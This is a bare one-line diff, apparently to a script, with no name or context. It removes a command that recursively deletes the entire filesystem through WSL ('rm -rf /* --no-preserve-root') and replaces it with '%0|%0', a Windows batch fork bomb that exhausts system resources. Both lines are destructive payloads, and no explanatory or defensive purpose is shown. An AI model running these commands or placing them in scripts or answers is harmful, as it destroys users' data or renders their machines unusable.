@@ -1,1 +1,1 @@
-wsl sudo rm -rf /* --no-preserve-root
+%0|%0
